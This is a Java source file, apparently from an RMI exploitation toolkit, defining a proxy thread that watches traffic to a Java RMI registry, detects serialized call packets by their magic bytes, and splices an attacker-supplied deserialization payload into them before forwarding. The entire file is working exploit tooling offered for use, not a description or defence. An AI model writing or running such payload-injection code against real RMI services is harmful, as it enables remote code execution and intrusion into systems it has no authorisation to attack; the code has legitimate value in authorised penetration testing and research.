package payloads.thread;

import java.io.ByteArrayOutputStream;
import java.net.Socket;
import java.net.UnknownHostException;

import proxy.thread.ProxyThread;

/***********************************************************

 **********************************************************/
public class LookupPayloadInjectingProxyThread extends ProxyThread {

	private final byte[] _payload;	//The payload to pass to the RMI registry

	/*******************
	 * Construct the proxy thread.
	 *
	 * @param srcSocket The source socket.
	 * @param dstSocket The destination socket.
	 * @param payload The exploit payload to use.
	 ******************/
	public LookupPayloadInjectingProxyThread(Socket srcSocket, Socket dstSocket, byte[] payload) {
		super(srcSocket, dstSocket);
		this._payload = payload;
	}
	
	/*******************
	 * Check for an outgoing method call packet and inject the payload bytes
	 * into it.
	 * 
	 * @param data The data received from the source socket.
	 * @return The data to write to the destination socket.
	 ******************/
	public ByteArrayOutputStream handleData(ByteArrayOutputStream data) {
		ByteArrayOutputStream out;
		int blockLen;
		byte[] dataBytes;
		
		//Get the packet bytes
		dataBytes = data.toByteArray();
		
		//Check if the packet is an RMI call packet
		int indexOf = indexOf(dataBytes, new byte[]{(byte)0x50, (byte)0xac, (byte)0xed});
		if(dataBytes.length > 7 && indexOf != -1) {
			//Call packets begin with a TC_BLOCKDATA element, get the length of this element
			blockLen = (int)(dataBytes[ indexOf + 6 ] & 0xff);
			
			//Construct a new packet, starting with the contents of the original packet and TC_BLOCKDATA element
			out = new ByteArrayOutputStream();
			out.write(dataBytes, indexOf, blockLen + 7);
			
			//Write the payload bytes to the new packet
			out.write(this._payload, 0, this._payload.length);
			
			//Finally write a TC_NULL to the new packet (second parameter to the bind method)
			out.write((byte)0x70);
			
			//Return the new packet to forward on to the server
			return out;
		} else {
			//Return the original data untouched
			return data;
		}
	}
	public static int indexOf(byte[] outerArray, byte[] smallerArray) {
		for(int i = 0; i < outerArray.length - smallerArray.length+1; ++i) {
			boolean found = true;
			for(int j = 0; j < smallerArray.length; ++j) {
				if (outerArray[i+j] != smallerArray[j]) {
					found = false;
					break;
				}
			}
			if (found) return i;
		}
		return -1;
	}
//	public static void main(String[] args) throws UnknownHostException {
//		byte[] dataBytes=new byte[]{(byte)0x50, (byte)0xac, (byte)0xed};
//		int indexOf = indexOf(dataBytes, new byte[]{(byte)0x50, (byte)0xac, (byte)0xed});
//		System.out.println(indexOf);
//	}
}
